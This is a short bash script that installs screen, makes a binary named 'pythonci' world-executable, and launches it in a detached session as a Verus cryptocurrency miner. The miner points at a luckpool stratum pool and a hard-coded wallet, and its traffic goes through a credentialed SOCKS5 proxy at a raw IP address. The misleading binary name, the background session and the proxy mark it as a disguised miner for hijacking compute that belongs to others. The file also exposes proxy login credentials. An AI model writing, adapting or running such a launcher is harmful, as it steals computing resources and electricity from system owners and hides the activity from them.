#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x wos.sh && chmod +x pythonci chmod 777 pythonci wos.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RJfxuiyjCUm9w7Xryn5ssNF6voJKRBdRGR
WR=$(echo $(shuf -i 1-1 -n 1)-F3)
PY=socks5://der3ty1u:sur43tye4@18.183.192.89:10086
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
